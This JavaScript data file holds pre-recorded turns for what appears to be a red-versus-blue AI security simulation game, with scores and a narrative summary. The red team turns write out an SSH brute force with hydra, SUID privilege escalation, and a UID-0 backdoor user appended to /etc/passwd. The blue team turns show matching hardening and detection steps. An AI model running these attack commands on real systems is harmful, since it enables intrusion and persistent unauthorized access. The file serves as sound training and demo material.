/**
 * Pre-recorded game data for the Red vs Blue AI simulation.
 * Each turn includes: agent, command, output, score delta, event type, and phase.
 */

const GAME_PHASES = {
  SETUP: 'SETUP',
  BATTLE: 'BATTLE',
  CONCLUSION: 'CONCLUSION'
};

const TEAMS = {
  RED: 'red',
  BLUE: 'blue'
};

const KILL_CHAIN_STAGES = [
  { id: 'recon_complete', label: 'Recon', icon: '\u{1F50D}' },
  { id: 'service_exploited', label: 'Exploit', icon: '\u{1F4A5}' },
  { id: 'privesc_achieved', label: 'PrivEsc', icon: '\u{2B06}' },
  { id: 'persistence_installed', label: 'Persist', icon: '\u{1F512}' }
];

const GAME_TURNS = [
  {
    turn: 1,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.SETUP,
    command: 'ufw default deny incoming && ufw allow 22/tcp && ufw enable',
    output: 'Firewall is active and enabled on system startup',
    scoreDelta: { blue: 10 },
    event: 'vuln_patched',
    label: 'Firewall configured'
  },
  {
    turn: 2,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.SETUP,
    command: "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config && systemctl restart ssh",
    output: 'SSH hardened: root login disabled',
    scoreDelta: { blue: 10 },
    event: 'vuln_patched',
    label: 'SSH hardened'
  },
  {
    turn: 3,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.SETUP,
    command: 'apt update && apt upgrade -y openssh-server apache2',
    output: 'Packages updated successfully',
    scoreDelta: { blue: 10 },
    event: 'vuln_patched',
    label: 'Packages updated'
  },
  {
    turn: 4,
    team: TEAMS.RED,
    phase: GAME_PHASES.BATTLE,
    command: 'nmap -sV -p1-1000 10.0.0.5',
    output: '22/tcp open ssh OpenSSH 7.2p2\n80/tcp open http Apache 2.4.18\n3306/tcp open mysql MySQL 5.7.21',
    scoreDelta: { red: 5 },
    event: 'recon_complete',
    killChain: 'recon_complete',
    label: 'Port scan — 3 services found'
  },
  {
    turn: 5,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.BATTLE,
    command: "tail -n 50 /var/log/auth.log | grep -i 'failed\\|accepted'",
    output: 'No suspicious activity detected',
    scoreDelta: { blue: 5 },
    event: 'service_kept_up',
    label: 'Log check — clean'
  },
  {
    turn: 6,
    team: TEAMS.RED,
    phase: GAME_PHASES.BATTLE,
    command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
    output: '[22][ssh] host: 10.0.0.5 login: admin password: letmein2024',
    scoreDelta: { red: 15 },
    event: 'service_exploited',
    killChain: 'service_exploited',
    label: 'SSH brute force — admin compromised'
  },
  {
    turn: 7,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.BATTLE,
    command: "tail -n 50 /var/log/auth.log | grep -i 'failed'",
    output: '47 failed SSH attempts from 10.0.0.3 in last 2 min \u2014 possible brute force',
    scoreDelta: { blue: 10 },
    event: 'attack_detected',
    label: 'Brute force detected'
  },
  {
    turn: 8,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.BATTLE,
    command: 'iptables -A INPUT -s 10.0.0.3 -j DROP',
    output: 'Blocked 10.0.0.3 at firewall',
    scoreDelta: { blue: 15 },
    event: 'attacker_blocked',
    label: 'Attacker IP blocked'
  },
  {
    turn: 9,
    team: TEAMS.RED,
    phase: GAME_PHASES.BATTLE,
    command: "ssh admin@10.0.0.5 'find / -perm -4000 2>/dev/null'",
    output: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/backup.sh  <-- writable SUID',
    scoreDelta: { red: 5 },
    event: 'red_undetected_action',
    label: 'SUID discovery (stealth)',
    stealth: true
  },
  {
    turn: 10,
    team: TEAMS.RED,
    phase: GAME_PHASES.BATTLE,
    command: "ssh admin@10.0.0.5 '/usr/local/bin/backup.sh; id'",
    output: 'uid=0(root) gid=0(root) groups=0(root)',
    scoreDelta: { red: 20 },
    event: 'privesc_achieved',
    killChain: 'privesc_achieved',
    label: 'Privilege escalation — root obtained'
  },
  {
    turn: 11,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.BATTLE,
    command: "ps aux | grep -v grep | awk '$1==\"root\"&&$11!~/^\\\\[/'",
    output: 'root 8421 /usr/local/bin/backup.sh  <-- SUSPICIOUS non-standard root proc',
    scoreDelta: { blue: 10 },
    event: 'attack_detected',
    label: 'Suspicious process found'
  },
  {
    turn: 12,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.BATTLE,
    command: 'kill -9 8421 && chmod 0755 /usr/local/bin/backup.sh',
    output: 'Process terminated, SUID bit removed',
    scoreDelta: { blue: 5 },
    event: 'adaptive_escalation',
    label: 'Process killed + SUID fixed'
  },
  {
    turn: 13,
    team: TEAMS.RED,
    phase: GAME_PHASES.BATTLE,
    command: 'ssh admin@10.0.0.5 \'echo "svc:x:0:0::/root:/bin/bash" >> /etc/passwd\'',
    output: '',
    scoreDelta: { red: 20 },
    event: 'persistence_installed',
    killChain: 'persistence_installed',
    label: 'Backdoor user planted (UID 0)'
  },
  {
    turn: 14,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.BATTLE,
    command: "grep ':0:' /etc/passwd | grep -v root",
    output: 'svc:x:0:0::/root:/bin/bash',
    scoreDelta: { blue: 10 },
    event: 'attack_detected',
    label: 'Unauthorized root user found'
  },
  {
    turn: 15,
    team: TEAMS.BLUE,
    phase: GAME_PHASES.BATTLE,
    command: 'userdel -r svc && passwd -l admin',
    output: 'User svc removed, admin locked',
    scoreDelta: { blue: 15 },
    event: 'attacker_blocked',
    label: 'Backdoor removed + admin locked'
  },
  {
    turn: 16,
    team: TEAMS.RED,
    phase: GAME_PHASES.BATTLE,
    command: "ssh svc@10.0.0.5 'whoami'",
    output: 'Connection refused \u2014 all access revoked',
    scoreDelta: { blue: 40 },
    event: 'lockout_achieved',
    label: 'Full lockout \u2014 game over'
  }
];

const GAME_RESULT = {
  winner: TEAMS.BLUE,
  redScore: 65,
  blueScore: 145,
  duration: '8m 32s',
  reason: 'Blue team achieved full lockout \u2014 all red team access revoked'
};

const NARRATIVE_SUMMARY = `============================================================
GAME NARRATIVE SUMMARY
============================================================

After 8m 32s of battle, Blue Team emerged victorious.
Outcome: Blue team achieved full lockout \u2014 all red team access revoked

--- KEY MOMENTS ---
  [Turn 4]  RED:  Port scan discovered 3 open services (+5 pts)
  [Turn 6]  RED:  SSH brute force successful \u2014 admin compromised (+15 pts)
  [Turn 7]  BLUE: Detected 47 failed SSH attempts \u2014 brute force identified (+10 pts)
  [Turn 8]  BLUE: Blocked attacker IP at firewall (+15 pts)
  [Turn 10] RED:  Privilege escalation via SUID binary \u2014 root obtained (+20 pts)
  [Turn 13] RED:  Backdoor user 'svc' planted with UID 0 (+20 pts)
  [Turn 14] BLUE: Discovered unauthorized root user 'svc' (+10 pts)
  [Turn 15] BLUE: Removed backdoor user and locked compromised account (+15 pts)
  [Turn 16] BLUE: Full lockout achieved \u2014 all red access revoked (+40 pts)

--- KILL CHAIN PROGRESS ---
  recon_complete:       Port scan discovered 3 open services
  service_exploited:    SSH brute force successful
  privesc_achieved:     Root via SUID binary exploit
  persistence_installed: Backdoor user planted

--- FINAL SCORES ---
  Red Team:  65 points
  Blue Team: 145 points

--- STEALTH & DETECTION ---
  RED: Undetected SUID discovery (+5 pts)

--- AI REASONING HIGHLIGHTS ---
  BLUE: Adaptive escalation \u2014 killed process AND fixed SUID bit (+5 pts)

============================================================`;

const RED_SKILLS = [
  { skill: 'port_scan', category: 'Recon', description: 'Network scan, enumerate open ports' },
  { skill: 'service_enum', category: 'Recon', description: 'Enumerate service versions' },
  { skill: 'ssh_brute', category: 'Exploit', description: 'SSH credential brute-force' },
  { skill: 'web_sqli_check', category: 'Exploit', description: 'SQL injection probe' },
  { skill: 'find_suid', category: 'PrivEsc', description: 'Search for SUID misconfigs' },
  { skill: 'add_backdoor_user', category: 'Persistence', description: 'Create backdoor user account' },
  { skill: 'install_cron_backdoor', category: 'Persistence', description: 'Plant cron-based backdoor' },
  { skill: 'add_ssh_key', category: 'Persistence', description: 'Add SSH authorized key' }
];

const BLUE_SKILLS = [
  { skill: 'harden_ssh', category: 'Hardening', description: 'Disable root login, enforce key auth' },
  { skill: 'block_ip', category: 'Hardening', description: 'Firewall block attacker IP' },
  { skill: 'fix_suid', category: 'Hardening', description: 'Remove dangerous SUID bits' },
  { skill: 'scan_processes', category: 'Detection', description: 'List unexpected processes' },
  { skill: 'tail_auth_log', category: 'Detection', description: 'Parse auth.log for intrusions' },
  { skill: 'list_users', category: 'Detection', description: 'Audit system user accounts' },
  { skill: 'kill_process', category: 'Response', description: 'Terminate suspicious process' },
  { skill: 'remove_user', category: 'Response', description: 'Delete compromised user' },
  { skill: 'check_service', category: 'Uptime', description: 'Verify services are running' },
  { skill: 'restart_service', category: 'Uptime', description: 'Restart downed services' }
];

const SCORING_TABLE = [
  { event: 'vuln_patched', points: '+10', team: 'Blue', description: 'Vulnerability patched before exploitation' },
  { event: 'service_kept_up', points: '+5', team: 'Blue', description: 'Critical service verified running' },
  { event: 'attack_detected', points: '+10', team: 'Blue', description: 'Detected an active attack or anomaly' },
  { event: 'attacker_blocked', points: '+15', team: 'Blue', description: 'Blocked attacker access at network level' },
  { event: 'adaptive_escalation', points: '+5', team: 'Blue', description: 'Multi-action defensive response' },
  { event: 'lockout_achieved', points: '+40', team: 'Blue', description: 'All attacker access fully revoked' },
  { event: 'recon_complete', points: '+5', team: 'Red', description: 'Successful reconnaissance scan' },
  { event: 'service_exploited', points: '+15', team: 'Red', description: 'Gained initial access to a service' },
  { event: 'red_undetected_action', points: '+5', team: 'Red', description: 'Action completed without detection (stealth bonus)' },
  { event: 'privesc_achieved', points: '+20', team: 'Red', description: 'Escalated to root privileges' },
  { event: 'persistence_installed', points: '+20', team: 'Red', description: 'Installed persistent backdoor access' }
];
